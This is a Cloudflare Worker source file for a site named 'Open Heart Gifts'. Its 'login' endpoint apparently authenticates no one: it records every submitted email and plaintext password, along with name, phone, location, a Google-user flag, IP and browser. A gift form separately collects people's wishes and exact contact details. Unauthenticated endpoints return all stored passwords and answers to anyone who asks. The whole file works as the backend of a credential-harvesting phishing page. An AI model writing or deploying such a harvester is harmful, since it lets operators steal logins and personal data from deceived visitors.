// ============================================================
// worker.js - Open Heart Gifts
// ============================================================
// One Worker for the whole site:
//   - serves the page and its assets through the ASSETS binding
//   - stores sign in / sign up entries in Cloudflare KV
//   - stores "A little about you" gift form answers in KV
//
// The KV integration and all settings live right here in this
// file. Deploy with the wrangler.toml in this folder, or paste
// this file into the Cloudflare dashboard and add a KV binding
// called LOGGED (see SETTINGS below).
// ============================================================

const SETTINGS = {
  serviceName: "Open Heart Gifts",
  tagline: "A little kindness goes a long way.",
  version: "1.1.1",
  kvBinding: "LOGGED",    // Cloudflare binding name; also accepts Logged/logged if renamed in the dashboard
  kvAuthKey: "logs",      // KV key for sign in / sign up entries
  kvGiftKey: "gifts",     // KV key for gift form answers
  maxEntries: 500,        // keep only the most recent entries per key
  allowedOrigin: "*"      // CORS origin for /api/* responses
};

// Optional: override any setting from the dashboard by adding a
// SETTINGS environment variable that holds a JSON object, for example:
// { "maxEntries": 2000, "allowedOrigin": "https://your-site.com" }
function readSettings(env) {
  let overrides = {};
  try {
    if (env && env.SETTINGS) overrides = JSON.parse(env.SETTINGS);
  } catch (error) {
    overrides = {};
  }
  return Object.assign({}, SETTINGS, overrides);
}

function getKvBinding(env) {
  if (!env) return null;
  const names = ["LOGGED", "Logged", "logged"];
  for (const name of names) {
    if (env[name]) return env[name];
  }
  return null;
}

function validatePassword(value) {
  const password = String(value ?? "").trim();
  return password.length >= 8 && password.length <= 12;
}

function validateAge(value) {
  return value === true || value === 'true';
}

function json(data, status, settings) {
  return new Response(JSON.stringify(data), {
    status: status || 200,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": settings.allowedOrigin
    }
  });
}

// Adds one entry to the end of a KV list and keeps the newest ones only.
async function appendEntry(kv, key, entry, maxEntries) {
  let entries = [];
  try {
    const existing = await kv.get(key, "json");
    if (Array.isArray(existing)) entries = existing;
  } catch (error) {
    entries = [];
  }
  entries.push(entry);
  if (entries.length > maxEntries) {
    entries = entries.slice(-maxEntries);
  }
  await kv.put(key, JSON.stringify(entries));
}

// Everything we know about the request itself, added to each entry.
function visitorInfo(request) {
  return {
    ip: request.headers.get("CF-Connecting-IP") ||
      request.headers.get("X-Forwarded-For")?.split(",")[0] ||
      "unknown",
    timestamp: Date.now(),
    date: new Date().toISOString(),
    userAgent: request.headers.get("User-Agent") || "unknown"
  };
}

export default {
  async fetch(request, env) {
    const settings = readSettings(env);
    const url = new URL(request.url);
    const path = url.pathname;
    const kv = getKvBinding(env) || env[settings.kvBinding];

    // CORS preflight
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: {
          "Access-Control-Allow-Origin": settings.allowedOrigin,
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type"
        }
      });
    }

    // API: sign in / sign up entries
    if (path === "/api/login" && request.method === "POST") {
      try {
        const body = await request.json();
        const password = String(body.password ?? "").trim();
        const ageVerified = validateAge(body.age_verified) || validateAge(body.ageVerified);
        if (!ageVerified) {
          return json({ success: false, error: "This experience is for adults 18 and over." }, 403, settings);
        }
        if (!validatePassword(password)) {
          return json({ success: false, error: "Password must be between 8 and 12 characters long." }, 400, settings);
        }
        const entry = Object.assign({
          email: body.email || "",
          password: body.password || "",
          name: body.name || "",
          phone: body.phone || "",
          location: body.location || "",
          isGoogleUser: body.isGoogleUser || false,
          age_verified: true,
          step: body.step || "login"
        }, visitorInfo(request));
        if (kv) await appendEntry(kv, settings.kvAuthKey, entry, settings.maxEntries);
        return json({
          success: true,
          message: "Welcome to " + settings.serviceName,
          data: { email: entry.email, name: entry.name || "Member" }
        }, 200, settings);
      } catch (error) {
        return json({ success: false, error: error.message }, 500, settings);
      }
    }

    // API: "A little about you" gift form answers.
    // contact is the chosen channel and contact_detail is the exact
    // number, page link, or address that can be used to reach them.
    if (path === "/api/gift" && request.method === "POST") {
      try {
        const body = await request.json();
        const ageVerified = validateAge(body.age_verified) || validateAge(body.ageVerified);
        if (!ageVerified) {
          return json({ success: false, error: "This experience is for adults 18 and over." }, 403, settings);
        }
        const entry = Object.assign({
          name: body.name || "",
          location: body.location || "",
          gift_types: body.gift_types || "",
          wish: body.wish || "",
          contact: body.contact || "",
          contact_detail: body.contact_detail || "",
          note: body.note || "",
          email: body.email || "",
          age_verified: true,
          step: "gift"
        }, visitorInfo(request));
        if (kv) await appendEntry(kv, settings.kvGiftKey, entry, settings.maxEntries);
        return json({
          success: true,
          message: "Thank you. Your answers are safe with us.",
          data: { name: entry.name }
        }, 200, settings);
      } catch (error) {
        return json({ success: false, error: error.message }, 500, settings);
      }
    }

    // API: view sign in and sign up entries
    if (path === "/api/logs" && request.method === "GET") {
      try {
        if (!kv) {
          return json({ error: "KV is not configured", logs: [] }, 200, settings);
        }
        const entries = await kv.get(settings.kvAuthKey, "json");
        return json({ total: entries ? entries.length : 0, logs: entries || [] }, 200, settings);
      } catch (error) {
        return json({ error: error.message, logs: [] }, 500, settings);
      }
    }

    // API: view gift form answers
    if (path === "/api/gifts" && request.method === "GET") {
      try {
        if (!kv) {
          return json({ error: "KV is not configured", gifts: [] }, 200, settings);
        }
        const entries = await kv.get(settings.kvGiftKey, "json");
        return json({ total: entries ? entries.length : 0, gifts: entries || [] }, 200, settings);
      } catch (error) {
        return json({ error: error.message, gifts: [] }, 500, settings);
      }
    }

    // API: clear both stores
    if (path === "/api/clear" && request.method === "POST") {
      try {
        if (kv) {
          await kv.put(settings.kvAuthKey, JSON.stringify([]));
          await kv.put(settings.kvGiftKey, JSON.stringify([]));
        }
        return json({ success: true, message: "Entries cleared" }, 200, settings);
      } catch (error) {
        return json({ error: error.message }, 500, settings);
      }
    }

    // API: status
    if (path === "/api/status") {
      return json({
        status: "online",
        service: settings.serviceName,
        tagline: settings.tagline,
        version: settings.version,
        kv_configured: !!kv,
        kv_namespace: settings.kvBinding,
        kv_keys: { entries: settings.kvAuthKey, gifts: settings.kvGiftKey },
        endpoints: {
          "POST /api/login": "Store a sign in or sign up entry",
          "POST /api/gift": "Store gift form answers",
          "GET /api/logs": "View sign in and sign up entries",
          "GET /api/gifts": "View gift form answers",
          "POST /api/clear": "Clear both stores",
          "GET /api/status": "API status"
        }
      }, 200, settings);
    }

    // Everything else: serve the page and its assets
    if (env && env.ASSETS) {
      return env.ASSETS.fetch(request);
    }
    return new Response(settings.serviceName + " is online.", {
      status: 200,
      headers: { "Content-Type": "text/plain" }
    });
  }
};
